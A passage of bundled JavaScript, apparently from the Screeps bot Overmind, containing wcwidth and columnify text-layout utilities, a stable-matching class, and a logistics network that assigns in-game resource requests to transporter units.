    [ 0x3099, 0x309A ], [ 0xA806, 0xA806 ], [ 0xA80B, 0xA80B ],
    [ 0xA825, 0xA826 ], [ 0xFB1E, 0xFB1E ], [ 0xFE00, 0xFE0F ],
    [ 0xFE20, 0xFE23 ], [ 0xFEFF, 0xFEFF ], [ 0xFFF9, 0xFFFB ],
    [ 0x10A01, 0x10A03 ], [ 0x10A05, 0x10A06 ], [ 0x10A0C, 0x10A0F ],
    [ 0x10A38, 0x10A3A ], [ 0x10A3F, 0x10A3F ], [ 0x1D167, 0x1D169 ],
    [ 0x1D173, 0x1D182 ], [ 0x1D185, 0x1D18B ], [ 0x1D1AA, 0x1D1AD ],
    [ 0x1D242, 0x1D244 ], [ 0xE0001, 0xE0001 ], [ 0xE0020, 0xE007F ],
    [ 0xE0100, 0xE01EF ]
];

var combining$1 = /*#__PURE__*/Object.freeze({
    default: combining,
    __moduleExports: combining
});

var defaults$2 = ( defaults$1 && defaults ) || defaults$1;

var combining$2 = ( combining$1 && combining ) || combining$1;

"use strict";




var DEFAULTS = {
  nul: 0,
  control: 0
};

var wcwidth_1 = function wcwidth(str) {
  return wcswidth(str, DEFAULTS)
};

var config = function(opts) {
  opts = defaults$2(opts || {}, DEFAULTS);
  return function wcwidth(str) {
    return wcswidth(str, opts)
  }
};

/*
 *  The following functions define the column width of an ISO 10646
 *  character as follows:
 *  - The null character (U+0000) has a column width of 0.
 *  - Other C0/C1 control characters and DEL will lead to a return value
 *    of -1.
 *  - Non-spacing and enclosing combining characters (general category
 *    code Mn or Me in the
 *    Unicode database) have a column width of 0.
 *  - SOFT HYPHEN (U+00AD) has a column width of 1.
 *  - Other format characters (general category code Cf in the Unicode
 *    database) and ZERO WIDTH
 *    SPACE (U+200B) have a column width of 0.
 *  - Hangul Jamo medial vowels and final consonants (U+1160-U+11FF)
 *    have a column width of 0.
 *  - Spacing characters in the East Asian Wide (W) or East Asian
 *    Full-width (F) category as
 *    defined in Unicode Technical Report #11 have a column width of 2.
 *  - All remaining characters (including all printable ISO 8859-1 and
 *    WGL4 characters, Unicode control characters, etc.) have a column
 *    width of 1.
 *  This implementation assumes that characters are encoded in ISO 10646.
*/

function wcswidth(str, opts) {
  if (typeof str !== 'string') return wcwidth(str, opts)

  var s = 0;
  for (var i = 0; i < str.length; i++) {
    var n = wcwidth(str.charCodeAt(i), opts);
    if (n < 0) return -1
    s += n;
  }

  return s
}

function wcwidth(ucs, opts) {
  // test for 8-bit control characters
  if (ucs === 0) return opts.nul
  if (ucs < 32 || (ucs >= 0x7f && ucs < 0xa0)) return opts.control

  // binary search in table of non-spacing characters
  if (bisearch(ucs)) return 0

  // if we arrive here, ucs is not a combining or C0/C1 control character
  return 1 +
      (ucs >= 0x1100 &&
       (ucs <= 0x115f ||                       // Hangul Jamo init. consonants
        ucs == 0x2329 || ucs == 0x232a ||
        (ucs >= 0x2e80 && ucs <= 0xa4cf &&
         ucs != 0x303f) ||                     // CJK ... Yi
        (ucs >= 0xac00 && ucs <= 0xd7a3) ||    // Hangul Syllables
        (ucs >= 0xf900 && ucs <= 0xfaff) ||    // CJK Compatibility Ideographs
        (ucs >= 0xfe10 && ucs <= 0xfe19) ||    // Vertical forms
        (ucs >= 0xfe30 && ucs <= 0xfe6f) ||    // CJK Compatibility Forms
        (ucs >= 0xff00 && ucs <= 0xff60) ||    // Fullwidth Forms
        (ucs >= 0xffe0 && ucs <= 0xffe6) ||
        (ucs >= 0x20000 && ucs <= 0x2fffd) ||
        (ucs >= 0x30000 && ucs <= 0x3fffd)));
}

function bisearch(ucs) {
  var min = 0;
  var max = combining$2.length - 1;
  var mid;

  if (ucs < combining$2[0][0] || ucs > combining$2[max][1]) return false

  while (max >= min) {
    mid = Math.floor((min + max) / 2);
    if (ucs > combining$2[mid][1]) min = mid + 1;
    else if (ucs < combining$2[mid][0]) max = mid - 1;
    else return true
  }

  return false
}
wcwidth_1.config = config;

var wcwidth$1 = /*#__PURE__*/Object.freeze({
    default: wcwidth_1,
    __moduleExports: wcwidth_1,
    config: config
});

var stripAnsi$2 = ( stripAnsi$1 && stripAnsi ) || stripAnsi$1;

var wcwidth$2 = ( wcwidth$1 && wcwidth_1 ) || wcwidth$1;

var width = function(str) {
  return wcwidth$2(stripAnsi$2(str))
};

var width$1 = /*#__PURE__*/Object.freeze({
    default: width,
    __moduleExports: width
});

var wcwidth$3 = ( width$1 && width ) || width$1;

"use strict";



/**
 * repeat string `str` up to total length of `len`
 *
 * @param String str string to repeat
 * @param Number len total length of output string
 */

function repeatString(str, len) {
  return Array.apply(null, {length: len + 1}).join(str).slice(0, len)
}

/**
 * Pad `str` up to total length `max` with `chr`.
 * If `str` is longer than `max`, padRight will return `str` unaltered.
 *
 * @param String str string to pad
 * @param Number max total length of output string
 * @param String chr optional. Character to pad with. default: ' '
 * @return String padded str
 */

function padRight(str, max, chr) {
  str = str != null ? str : '';
  str = String(str);
  var length = max - wcwidth$3(str);
  if (length <= 0) return str
  return str + repeatString(chr || ' ', length)
}

/**
 * Pad `str` up to total length `max` with `chr`.
 * If `str` is longer than `max`, padCenter will return `str` unaltered.
 *
 * @param String str string to pad
 * @param Number max total length of output string
 * @param String chr optional. Character to pad with. default: ' '
 * @return String padded str
 */

function padCenter(str, max, chr) {
  str = str != null ? str : '';
  str = String(str);
  var length = max - wcwidth$3(str);
  if (length <= 0) return str
  var lengthLeft = Math.floor(length/2);
  var lengthRight = length - lengthLeft;
  return repeatString(chr || ' ', lengthLeft) + str + repeatString(chr || ' ', lengthRight)
}

/**
 * Pad `str` up to total length `max` with `chr`, on the left.
 * If `str` is longer than `max`, padRight will return `str` unaltered.
 *
 * @param String str string to pad
 * @param Number max total length of output string
 * @param String chr optional. Character to pad with. default: ' '
 * @return String padded str
 */

function padLeft(str, max, chr) {
  str = str != null ? str : '';
  str = String(str);
  var length = max - wcwidth$3(str);
  if (length <= 0) return str
  return repeatString(chr || ' ', length) + str
}

/**
 * Split a String `str` into lines of maxiumum length `max`.
 * Splits on word boundaries. Preserves existing new lines.
 *
 * @param String str string to split
 * @param Number max length of each line
 * @return Array Array containing lines.
 */

function splitIntoLines(str, max) {
  function _splitIntoLines(str, max) {
    return str.trim().split(' ').reduce(function(lines, word) {
      var line = lines[lines.length - 1];
      if (line && wcwidth$3(line.join(' ')) + wcwidth$3(word) < max) {
        lines[lines.length - 1].push(word); // add to line
      }
      else lines.push([word]); // new line
      return lines
    }, []).map(function(l) {
      return l.join(' ')
    })
  }
  return str.split('\n').map(function(str) {
    return _splitIntoLines(str, max)
  }).reduce(function(lines, line) {
    return lines.concat(line)
  }, [])
}

/**
 * Add spaces and `truncationChar` between words of
 * `str` which are longer than `max`.
 *
 * @param String str string to split
 * @param Number max length of each line
 * @param Number truncationChar character to append to split words
 * @return String
 */

function splitLongWords(str, max, truncationChar) {
  str = str.trim();
  var result = [];
  var words = str.split(' ');
  var remainder = '';

  var truncationWidth = wcwidth$3(truncationChar);

  while (remainder || words.length) {
    if (remainder) {
      var word = remainder;
      remainder = '';
    } else {
      var word = words.shift();
    }

    if (wcwidth$3(word) > max) {
      // slice is based on length no wcwidth
      var i = 0;
      var wwidth = 0;
      var limit = max - truncationWidth;
      while (i < word.length) {
        var w = wcwidth$3(word.charAt(i));
        if (w + wwidth > limit) {
          break
        }
        wwidth += w;
        ++i;
      }

      remainder = word.slice(i); // get remainder
      // save remainder for next loop

      word = word.slice(0, i); // grab truncated word
      word += truncationChar; // add trailing … or whatever
    }
    result.push(word);
  }

  return result.join(' ')
}


/**
 * Truncate `str` into total width `max`
 * If `str` is shorter than `max`,  will return `str` unaltered.
 *
 * @param String str string to truncated
 * @param Number max total wcwidth of output string
 * @return String truncated str
 */

function truncateString(str, max) {

  str = str != null ? str : '';
  str = String(str);

  if(max == Infinity) return str

  var i = 0;
  var wwidth = 0;
  while (i < str.length) {
    var w = wcwidth$3(str.charAt(i));
    if(w + wwidth > max)
      break
    wwidth += w;
    ++i;
  }
  return str.slice(0, i)
}



/**
 * Exports
 */

var padRight_1 = padRight;
var padCenter_1 = padCenter;
var padLeft_1 = padLeft;
var splitIntoLines_1 = splitIntoLines;
var splitLongWords_1 = splitLongWords;
var truncateString_1 = truncateString;

var utils = {
    padRight: padRight_1,
    padCenter: padCenter_1,
    padLeft: padLeft_1,
    splitIntoLines: splitIntoLines_1,
    splitLongWords: splitLongWords_1,
    truncateString: truncateString_1
};

var utils$1 = /*#__PURE__*/Object.freeze({
    default: utils,
    __moduleExports: utils,
    padRight: padRight_1,
    padCenter: padCenter_1,
    padLeft: padLeft_1,
    splitIntoLines: splitIntoLines_1,
    splitLongWords: splitLongWords_1,
    truncateString: truncateString_1
});

var _require = ( utils$1 && utils ) || utils$1;

"use strict";





var padRight$1 = _require.padRight;
var padCenter$1 = _require.padCenter;
var padLeft$1 = _require.padLeft;
var splitIntoLines$1 = _require.splitIntoLines;
var splitLongWords$1 = _require.splitLongWords;
var truncateString$1 = _require.truncateString;

var DEFAULT_HEADING_TRANSFORM = function DEFAULT_HEADING_TRANSFORM(key) {
  return key.toUpperCase();
};

var DEFAULT_DATA_TRANSFORM = function DEFAULT_DATA_TRANSFORM(cell, column, index) {
  return cell;
};

var DEFAULTS$1 = Object.freeze({
  maxWidth: Infinity,
  minWidth: 0,
  columnSplitter: ' ',
  truncate: false,
  truncateMarker: '…',
  preserveNewLines: false,
  paddingChr: ' ',
  showHeaders: true,
  headingTransform: DEFAULT_HEADING_TRANSFORM,
  dataTransform: DEFAULT_DATA_TRANSFORM
});

var columnify = function (items) {
  var options = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];

  var columnConfigs = options.config || {};
  delete options.config; // remove config so doesn't appear on every column.

  var maxLineWidth = options.maxLineWidth || Infinity;
  if (maxLineWidth === 'auto') maxLineWidth = process.stdout.columns || Infinity;
  delete options.maxLineWidth; // this is a line control option, don't pass it to column

  // Option defaults inheritance:
  // options.config[columnName] => options => DEFAULTS
  options = mixin({}, DEFAULTS$1, options);

  options.config = options.config || Object.create(null);

  options.spacing = options.spacing || '\n'; // probably useless
  options.preserveNewLines = !!options.preserveNewLines;
  options.showHeaders = !!options.showHeaders;
  options.columns = options.columns || options.include; // alias include/columns, prefer columns if supplied
  var columnNames = options.columns || []; // optional user-supplied columns to include

  items = toArray(items, columnNames);

  // if not suppled column names, automatically determine columns from data keys
  if (!columnNames.length) {
    items.forEach(function (item) {
      for (var columnName in item) {
        if (columnNames.indexOf(columnName) === -1) columnNames.push(columnName);
      }
    });
  }

  // initialize column defaults (each column inherits from options.config)
  var columns = columnNames.reduce(function (columns, columnName) {
    var column = Object.create(options);
    columns[columnName] = mixin(column, columnConfigs[columnName]);
    return columns;
  }, Object.create(null));

  // sanitize column settings
  columnNames.forEach(function (columnName) {
    var column = columns[columnName];
    column.name = columnName;
    column.maxWidth = Math.ceil(column.maxWidth);
    column.minWidth = Math.ceil(column.minWidth);
    column.truncate = !!column.truncate;
    column.align = column.align || 'left';
  });

  // sanitize data
  items = items.map(function (item) {
    var result = Object.create(null);
    columnNames.forEach(function (columnName) {
      // null/undefined -> ''
      result[columnName] = item[columnName] != null ? item[columnName] : '';
      // toString everything
      result[columnName] = '' + result[columnName];
      if (columns[columnName].preserveNewLines) {
        // merge non-newline whitespace chars
        result[columnName] = result[columnName].replace(/[^\S\n]/gmi, ' ');
      } else {
        // merge all whitespace chars
        result[columnName] = result[columnName].replace(/\s/gmi, ' ');
      }
    });
    return result;
  });

  // transform data cells
  columnNames.forEach(function (columnName) {
    var column = columns[columnName];
    items = items.map(function (item, index) {
      var col = Object.create(column);
      item[columnName] = column.dataTransform(item[columnName], col, index);

      var changedKeys = Object.keys(col);
      // disable default heading transform if we wrote to column.name
      if (changedKeys.indexOf('name') !== -1) {
        if (column.headingTransform !== DEFAULT_HEADING_TRANSFORM) return;
        column.headingTransform = function (heading) {
          return heading;
        };
      }
      changedKeys.forEach(function (key) {
        return column[key] = col[key];
      });
      return item;
    });
  });

  // add headers
  var headers = {};
  if (options.showHeaders) {
    columnNames.forEach(function (columnName) {
      var column = columns[columnName];

      if (!column.showHeaders) {
        headers[columnName] = '';
        return;
      }

      headers[columnName] = column.headingTransform(column.name);
    });
    items.unshift(headers);
  }
  // get actual max-width between min & max
  // based on length of data in columns
  columnNames.forEach(function (columnName) {
    var column = columns[columnName];
    column.width = items.map(function (item) {
      return item[columnName];
    }).reduce(function (min, cur) {
      // if already at maxWidth don't bother testing
      if (min >= column.maxWidth) return min;
      return Math.max(min, Math.min(column.maxWidth, Math.max(column.minWidth, wcwidth$3(cur))));
    }, 0);
  });

  // split long words so they can break onto multiple lines
  columnNames.forEach(function (columnName) {
    var column = columns[columnName];
    items = items.map(function (item) {
      item[columnName] = splitLongWords$1(item[columnName], column.width, column.truncateMarker);
      return item;
    });
  });

  // wrap long lines. each item is now an array of lines.
  columnNames.forEach(function (columnName) {
    var column = columns[columnName];
    items = items.map(function (item, index) {
      var cell = item[columnName];
      item[columnName] = splitIntoLines$1(cell, column.width);

      // if truncating required, only include first line + add truncation char
      if (column.truncate && item[columnName].length > 1) {
        item[columnName] = splitIntoLines$1(cell, column.width - wcwidth$3(column.truncateMarker));
        var firstLine = item[columnName][0];
        if (!endsWith(firstLine, column.truncateMarker)) item[columnName][0] += column.truncateMarker;
        item[columnName] = item[columnName].slice(0, 1);
      }
      return item;
    });
  });

  // recalculate column widths from truncated output/lines
  columnNames.forEach(function (columnName) {
    var column = columns[columnName];
    column.width = items.map(function (item) {
      return item[columnName].reduce(function (min, cur) {
        if (min >= column.maxWidth) return min;
        return Math.max(min, Math.min(column.maxWidth, Math.max(column.minWidth, wcwidth$3(cur))));
      }, 0);
    }).reduce(function (min, cur) {
      if (min >= column.maxWidth) return min;
      return Math.max(min, Math.min(column.maxWidth, Math.max(column.minWidth, cur)));
    }, 0);
  });

  var rows = createRows(items, columns, columnNames, options.paddingChr); // merge lines into rows
  // conceive output
  return rows.reduce(function (output, row) {
    return output.concat(row.reduce(function (rowOut, line) {
      return rowOut.concat(line.join(options.columnSplitter));
    }, []));
  }, []).map(function (line) {
    return truncateString$1(line, maxLineWidth);
  }).join(options.spacing);
};

/**
 * Convert wrapped lines into rows with padded values.
 *
 * @param Array items data to process
 * @param Array columns column width settings for wrapping
 * @param Array columnNames column ordering
 * @return Array items wrapped in arrays, corresponding to lines
 */

function createRows(items, columns, columnNames, paddingChr) {
  return items.map(function (item) {
    var row = [];
    var numLines = 0;
    columnNames.forEach(function (columnName) {
      numLines = Math.max(numLines, item[columnName].length);
    });
    // combine matching lines of each rows

    var _loop = function _loop(i) {
      row[i] = row[i] || [];
      columnNames.forEach(function (columnName) {
        var column = columns[columnName];
        var val = item[columnName][i] || ''; // || '' ensures empty columns get padded
        if (column.align === 'right') row[i].push(padLeft$1(val, column.width, paddingChr));else if (column.align === 'center' || column.align === 'centre') row[i].push(padCenter$1(val, column.width, paddingChr));else row[i].push(padRight$1(val, column.width, paddingChr));
      });
    };

    for (var i = 0; i < numLines; i++) {
      _loop(i);
    }
    return row;
  });
}

/**
 * Object.assign
 *
 * @return Object Object with properties mixed in.
 */

function mixin() {
  var _Object;

  if (Object.assign) return (_Object = Object).assign.apply(_Object, arguments);
  return ObjectAssign.apply(undefined, arguments);
}

function ObjectAssign(target, firstSource) {
  "use strict";

  if (target === undefined || target === null) throw new TypeError("Cannot convert first argument to object");

  var to = Object(target);

  var hasPendingException = false;
  var pendingException;

  for (var i = 1; i < arguments.length; i++) {
    var nextSource = arguments[i];
    if (nextSource === undefined || nextSource === null) continue;

    var keysArray = Object.keys(Object(nextSource));
    for (var nextIndex = 0, len = keysArray.length; nextIndex < len; nextIndex++) {
      var nextKey = keysArray[nextIndex];
      try {
        var desc = Object.getOwnPropertyDescriptor(nextSource, nextKey);
        if (desc !== undefined && desc.enumerable) to[nextKey] = nextSource[nextKey];
      } catch (e) {
        if (!hasPendingException) {
          hasPendingException = true;
          pendingException = e;
        }
      }
    }

    if (hasPendingException) throw pendingException;
  }
  return to;
}

/**
 * Adapted from String.prototype.endsWith polyfill.
 */

function endsWith(target, searchString, position) {
  position = position || target.length;
  position = position - searchString.length;
  var lastIndex = target.lastIndexOf(searchString);
  return lastIndex !== -1 && lastIndex === position;
}

function toArray(items, columnNames) {
  if (Array.isArray(items)) return items;
  var rows = [];
  for (var key in items) {
    var item = {};
    item[columnNames[0] || 'key'] = key;
    item[columnNames[1] || 'value'] = items[key];
    rows.push(item);
  }
  return rows;
}
var columnify_1 = columnify.columnify;

let Matcher = class Matcher {
    constructor(menPrefs, womenPrefs) {
        this.menPrefs = menPrefs;
        this.womenPrefs = womenPrefs;
        this.men = _.keys(menPrefs);
        this.women = _.keys(womenPrefs);
        this.menFree = _.zipObject(this.men, _.map(this.men, man => true));
        this.womenFree = _.zipObject(this.women, _.map(this.women, woman => true));
        this.couples = {};
    }
    /* Return whether the woman prefer man1 over man2 */
    prefers(woman, man1, man2) {
        return _.indexOf(this.womenPrefs[woman], man1) < _.indexOf(this.womenPrefs[woman], man2);
    }
    /* Engage a couple <3 */
    engage(man, woman) {
        this.menFree[man] = false;
        this.womenFree[woman] = false;
        _.remove(this.menPrefs[man], w => w == woman); // Remove the woman that the man proposed to
        // Don't remove from women prefs since we're matching from men side
        this.couples[man] = woman;
    }
    /* Break up a couple... </3 :'( */
    breakup(man, woman) {
        this.menFree[man] = true;
        this.womenFree[woman] = true;
        // Don't do anything to the preferences of men or women since they've already proposed
        delete this.couples[man];
    }
    /* Return the first free man who still has someone left to propose to */
    nextMan() {
        return _.find(this.men, man => this.menFree[man] && this.menPrefs[man].length > 0);
    }
    match() {
        const MAX_ITERATIONS = 1000;
        let count = 0;
        let man = this.nextMan();
        while (man) { // While there exists a free man who still has someone to propose to
            if (count > MAX_ITERATIONS) {
                console.log('Stable matching timed out!');
                return this.couples;
            }
            const woman = _.first(this.menPrefs[man]); // Get first woman on man's list
            if (this.womenFree[woman]) { // If woman is free, get engaged
                this.engage(man, woman);
            }
            else { // Else if woman prefers this man to her current, swap men
                const currentMan = _.findKey(this.couples, w => w == woman);
                if (this.prefers(woman, man, currentMan)) {
                    this.breakup(currentMan, woman);
                    this.engage(man, woman);
                }
                else {
                    _.remove(this.menPrefs[man], w => w == woman); // Record an unsuccessful proposal
                }
            }
            man = this.nextMan();
            count++;
        }
        return this.couples;
    }
};
Matcher = __decorate([
    profile
], Matcher);

/* tslint:disable:variable-name */
var LogisticsNetwork_1;
const ALL_RESOURCE_TYPE_ERROR = `Improper logistics request: 'all' can only be used for store structure or tombstone!`;
const LogisticsNetworkMemoryDefaults = {
    transporterCache: {},
};
/**
 * Logistics network: efficiently partners resource requests with transporters using a stable matching algorithm to
 * provide general-purpose resource transport. For a better explanation of how this system works, see my blog post:
 * https://bencbartlett.wordpress.com/2018/03/28/screeps-4-hauling-is-np-hard/
 */
let LogisticsNetwork = LogisticsNetwork_1 = class LogisticsNetwork {
    constructor(colony) {
        this.memory = Mem.wrap(colony.memory, 'logisticsNetwork', LogisticsNetworkMemoryDefaults);
        this.requests = [];
        this.targetToRequest = {};
        this.colony = colony;
        // this.transporters = _.filter(colony.getCreepsByRole(TransporterSetup.role),
        //                           creep => !creep.spawning &&
        //                                    creep.carryCapacity >= LogisticsNetwork.settings.carryThreshold);
        this.buffers = _.compact([colony.storage, colony.terminal]);
        this.cache = {
            nextAvailability: {},
            predictedTransporterCarry: {},
            resourceChangeRate: {}
        };
        // this.logisticPositions = {};
        // for (let room of this.colony.rooms) {
        //  this.logisticPositions[room.name] = _.map([...room.storageUnits, ...room.links], s => s.pos);
        // }
    }
    refresh() {
        this.memory = Mem.wrap(this.colony.memory, 'logisticsNetwork', LogisticsNetworkMemoryDefaults);
        this.requests = [];
        this.targetToRequest = {};
        this._matching = undefined;
        this.cache = {
            nextAvailability: {},
            predictedTransporterCarry: {},
            resourceChangeRate: {}
        };
    }
    // Request and provide functions ===================================================================================
    /**
     * Request for resources to be deposited into this target
     */
    requestInput(target, opts = {}) {
        _.defaults(opts, {
            resourceType: RESOURCE_ENERGY,
            multiplier: 1,
            dAmountdt: 0,
        });
        if (target.room != this.colony.room) {
            log.warning(`${target.ref} at ${target.pos.print} is outside colony room; shouldn't request!`);
            return;
        }
        if (opts.resourceType == 'all') {
            log.warning(`Logistics request error: 'all' can only be used for output requests`);
            return;
        }
        if (!opts.amount) {
            opts.amount = this.getInputAmount(target, opts.resourceType);
        }
        // Register the request
        const requestID = this.requests.length;
        const req = {
            id: requestID.toString(),
            target: target,
            amount: opts.amount,
            dAmountdt: opts.dAmountdt,
            resourceType: opts.resourceType,
            multiplier: opts.multiplier,
        };
        this.requests.push(req);
        this.targetToRequest[req.target.ref] = requestID;
    }
    /**
     * Request for resources to be withdrawn from this target
     */
    requestOutput(target, opts = {}) {
        _.defaults(opts, {
            resourceType: RESOURCE_ENERGY,
            multiplier: 1,
            dAmountdt: 0,
        });
        if (opts.resourceType == 'all' && (isStoreStructure(target) || isTombstone(target))) {
            if (_.sum(target.store) == target.store.energy) {
                opts.resourceType = RESOURCE_ENERGY; // convert "all" requests to energy if that's all they have
            }
        }
        if (!opts.amount) {
            opts.amount = this.getOutputAmount(target, opts.resourceType);
        }
        opts.amount *= -1;
        (opts.dAmountdt) *= -1;
        // Register the request
        const requestID = this.requests.length;
        const req = {
            id: requestID.toString(),
            target: target,
            amount: opts.amount,
            dAmountdt: opts.dAmountdt,
            resourceType: opts.resourceType,
            multiplier: opts.multiplier,
        };
        this.requests.push(req);
        this.targetToRequest[req.target.ref] = requestID;
    }
    /**
     * Requests output for every mineral in a requestor object
     */
    requestOutputMinerals(target, opts = {}) {
        for (const resourceType in target.store) {
            if (resourceType == RESOURCE_ENERGY)
                continue;
            const amount = target.store[resourceType] || 0;
            if (amount > 0) {
                opts.resourceType = resourceType;
                this.requestOutput(target, opts);
            }
        }
    }
    getInputAmount(target, resourceType) {
        // if (target instanceof DirectivePickup) {
        //  return target.storeCapacity - _.sum(target.store);
        // } else
        if (isResource(target) || isTombstone(target)) {
            log.error(`Improper logistics request: should not request input for resource or tombstone!`);
            return 0;
        }
        else if (isStoreStructure(target)) {
            return target.storeCapacity - _.sum(target.store);
        }
        else if (isEnergyStructure(target) && resourceType == RESOURCE_ENERGY) {
            return target.energyCapacity - target.energy;
        }
        // else if (target instanceof Zerg) {
        //  return target.carryCapacity - _.sum(target.carry);
        // }
        else {
            if (target instanceof StructureLab) {
                if (resourceType == target.mineralType) {
                    return target.mineralCapacity - target.mineralAmount;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energyCapacity - target.energy;
                }
            }
            else if (target instanceof StructureNuker) {
                if (resourceType == RESOURCE_GHODIUM) {
                    return target.ghodiumCapacity - target.ghodium;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energyCapacity - target.energy;
                }
            }
            else if (target instanceof StructurePowerSpawn) {
                if (resourceType == RESOURCE_POWER) {
                    return target.powerCapacity - target.power;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energyCapacity - target.energy;
                }
            }
        }
        log.warning('Could not determine input amount!');
        return 0;
    }
    getOutputAmount(target, resourceType) {
        if (resourceType == 'all') {
            if (isTombstone(target) || isStoreStructure(target)) {
                return _.sum(target.store);
            }
            else {
                log.error(ALL_RESOURCE_TYPE_ERROR);
                return 0;
            }
        }
        else {
            if (isResource(target)) {
                return target.amount;
            }
            else if (isTombstone(target)) {
                return target.store[resourceType] || 0;
            }
            else if (isStoreStructure(target)) {
                return target.store[resourceType] || 0;
            }
            else if (isEnergyStructure(target) && resourceType == RESOURCE_ENERGY) {
                return target.energy;
            }
            // else if (target instanceof Zerg) {
            //  return target.carry[resourceType]!;
            // }
            else {
                if (target instanceof StructureLab) {
                    if (resourceType == target.mineralType) {
                        return target.mineralAmount;
                    }
                    else if (resourceType == RESOURCE_ENERGY) {
                        return target.energy;
                    }
                }
                else if (target instanceof StructureNuker) {
                    if (resourceType == RESOURCE_GHODIUM) {
                        return target.ghodium;
                    }
                    else if (resourceType == RESOURCE_ENERGY) {
                        return target.energy;
                    }
                }
                else if (target instanceof StructurePowerSpawn) {
                    if (resourceType == RESOURCE_POWER) {
                        return target.power;
                    }
                    else if (resourceType == RESOURCE_ENERGY) {
                        return target.energy;
                    }
                }
            }
        }
        log.warning('Could not determine output amount!');
        return 0;
    }
    // Transporter availability and predictive functions ===============================================================
    computeNextAvailability(transporter) {
        if (transporter.task) {
            let approximateDistance = transporter.task.eta;
            let pos = transporter.pos;
            const targetPositions = transporter.task.targetPosManifest;
            // If there is a well-defined task ETA, use that as the first leg, else set dist to zero and use range
            if (approximateDistance) {
                for (const targetPos of targetPositions.slice(1)) {
                    // The path lengths between any two logistics targets should be well-memorized
                    approximateDistance += Math.ceil(pos.getMultiRoomRangeTo(targetPos)
                        * LogisticsNetwork_1.settings.rangeToPathHeuristic);
                    // approximateDistance += Pathing.distance(pos, targetPos);
                    pos = targetPos;
                }
            }
            else {
                // This probably shouldn't happen...
                approximateDistance = 0;
                for (const targetPos of targetPositions) {
                    approximateDistance += Math.ceil(pos.getMultiRoomRangeTo(targetPos)
                        * LogisticsNetwork_1.settings.rangeToPathHeuristic);
                    // approximateDistance += Pathing.distance(pos, targetPos);
                    pos = targetPos;
                }
            }
            return [approximateDistance, pos];
        }
        else {
            // Report the transporter as being near a logistics target so that Pathing.distance() won't waste CPU
            // let nearbyLogisticPositions = transporter.pos.findInRange(this.logisticPositions[transporter.room.name], 2);
            return [0, transporter.pos];
        }
    }
    /**
     * Number of ticks until the transporter is available and where it will be
     */
    nextAvailability(transporter) {
        if (!this.cache.nextAvailability[transporter.name]) {
            this.cache.nextAvailability[transporter.name] = this.computeNextAvailability(transporter);
        }
        return this.cache.nextAvailability[transporter.name];
    }
    static targetingTransporters(target, excludedTransporter) {
        const targetingZerg = _.map(target.targetedBy, name => Overmind.zerg[name]);
        const targetingTransporters = _.filter(targetingZerg, zerg => zerg.roleName == Roles.transport);
        if (excludedTransporter) {
            _.remove(targetingTransporters, transporter => transporter.name == excludedTransporter.name);
        }
        return targetingTransporters;
    }
    /**
     * Returns the predicted state of the transporter's carry after completing its current task
     */
    computePredictedTransporterCarry(transporter, nextAvailability) {
        if (transporter.task && transporter.task.target) {
            const requestID = this.targetToRequest[transporter.task.target.ref];
            if (requestID) {
                const request = this.requests[requestID];
                if (request) {
                    const carry = transporter.carry;
                    const remainingCapacity = transporter.carryCapacity - _.sum(carry);
                    const resourceAmount = -1 * this.predictedRequestAmount(transporter, request, nextAvailability);
                    // ^ need to multiply amount by -1 since transporter is doing complement of what request needs
                    if (request.resourceType == 'all') {
                        if (!isStoreStructure(request.target) && !isTombstone(request.target)) {
                            log.error(ALL_RESOURCE_TYPE_ERROR);
                            return { energy: 0 };
                        }
                        for (const resourceType in request.target.store) {
                            const resourceFraction = (request.target.store[resourceType] || 0)
                                / _.sum(request.target.store);
                            if (carry[resourceType]) {
                                carry[resourceType] += resourceAmount * resourceFraction;
                                carry[resourceType] = minMax(carry[resourceType], 0, remainingCapacity);
                            }
                            else {
                                carry[resourceType] = minMax(resourceAmount, 0, remainingCapacity);
                            }
                        }
                    }
                    else {
                        if (carry[request.resourceType]) {
                            carry[request.resourceType] += resourceAmount;
                            carry[request.resourceType] = minMax(carry[request.resourceType], 0, remainingCapacity);
                        }
                        else {
                            carry[request.resourceType] = minMax(resourceAmount, 0, remainingCapacity);
                        }
                    }
                    return carry;
                }
            }
        }
        return transporter.carry;
    }
    /**
     * Returns the predicted state of the transporter's carry after completing its task
     */
    predictedTransporterCarry(transporter) {
        if (!this.cache.predictedTransporterCarry[transporter.name]) {
            this.cache.predictedTransporterCarry[transporter.name] = this.computePredictedTransporterCarry(transporter);
        }
        return this.cache.predictedTransporterCarry[transporter.name];
    }
    /**
     * Returns the effective amount that a transporter will see upon arrival, accounting for other targeting creeps
     */
    predictedRequestAmount(transporter, request, nextAvailability) {
        // Figure out when/where the transporter will be free
        let busyUntil;
        let newPos;
        if (!nextAvailability) {
            [busyUntil, newPos] = this.nextAvailability(transporter);
        }
        else {
            [busyUntil, newPos] = nextAvailability;
        }
        // let eta = busyUntil + Pathing.distance(newPos, request.target.pos);
        const eta = busyUntil + LogisticsNetwork_1.settings.rangeToPathHeuristic *
            newPos.getMultiRoomRangeTo(request.target.pos);
        const predictedDifference = request.dAmountdt * eta; // dAmountdt has same sign as amount
        // Account for other transporters targeting the target
        const otherTargetingTransporters = LogisticsNetwork_1.targetingTransporters(request.target, transporter);
        // let closerTargetingTransporters = _.filter(otherTargetingTransporters,
        //                                         transporter => this.nextAvailability(transporter)[0] < eta);
        if (request.amount > 0) { // input state, resources into target
            let predictedAmount = request.amount + predictedDifference;
            if (isStoreStructure(request.target)) { // cap predicted amount at storeCapacity
                predictedAmount = Math.min(predictedAmount, request.target.storeCapacity);
            }
            else if (isEnergyStructure(request.target)) {
                predictedAmount = Math.min(predictedAmount, request.target.energyCapacity);
            }
            const resourceInflux = _.sum(_.map(otherTargetingTransporters, other => (other.carry[request.resourceType] || 0)));
            predictedAmount = Math.max(predictedAmount - resourceInflux, 0);
            return predictedAmount;
        }
        else { // output state, resources withdrawn from target
            let predictedAmount = request.amount + predictedDifference;
            if (isStoreStructure(request.target)) { // cap predicted amount at -1 * storeCapacity
                predictedAmount = Math.max(predictedAmount, -1 * request.target.storeCapacity);
            }
            else if (isEnergyStructure(request.target)) {
                predictedAmount = Math.min(predictedAmount, -1 * request.target.energyCapacity);
            }
            const resourceOutflux = _.sum(_.map(otherTargetingTransporters, other => other.carryCapacity - _.sum(other.carry)));
            predictedAmount = Math.min(predictedAmount + resourceOutflux, 0);
            return predictedAmount;
        }
    }
